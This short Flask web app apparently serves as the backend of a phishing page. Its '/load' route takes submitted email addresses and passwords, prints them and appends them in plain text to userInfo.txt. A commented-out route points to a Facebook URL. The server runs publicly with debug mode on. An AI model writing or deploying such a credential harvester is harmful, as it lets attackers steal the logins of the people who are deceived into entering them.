from  flask import Flask, render_template, request, url_for

app = Flask(__name__)

@app.route('/', methods = ['GET', 'POST'])
def index():
	return render_template('home.html')

@app.route('/load', methods = ['GET', 'POST'])
def load():
  print("pap")
  email = request.values['email']
  password = request.values['pass']
  print(email)
  print(password)
  path = 'userInfo.txt'
  f = open(path, 'a')
  lines = [email+" "+password+'\n']
  f.writelines(lines)
  f.close()
  return render_template('load.html')
    
'''@app.route('/submit', methods = ['GET', 'POST'])
def submit():
    nums = request.values['nums']
    print(nums)
    return render_template('https://zh-tw.facebook.com/')'''

if __name__ == '__main__':
  app.run(host = '0.0.0.0' ,port = 80,debug=True)